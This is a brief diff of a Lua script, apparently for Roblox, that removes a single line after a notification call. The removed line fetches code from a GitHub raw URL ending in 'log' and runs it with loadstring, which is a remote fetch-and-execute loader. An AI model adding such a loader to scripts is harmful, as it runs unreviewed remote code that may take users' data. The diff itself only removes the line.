@@ -559,4 +559,4 @@ game.StarterGui:SetCore("SendNotification",{
     Duration = 10;
 })
 
-loadstring(game:HttpGEt(("https://raw.githubusercontent.com/Bytes77/stuff/main/log"))()
+
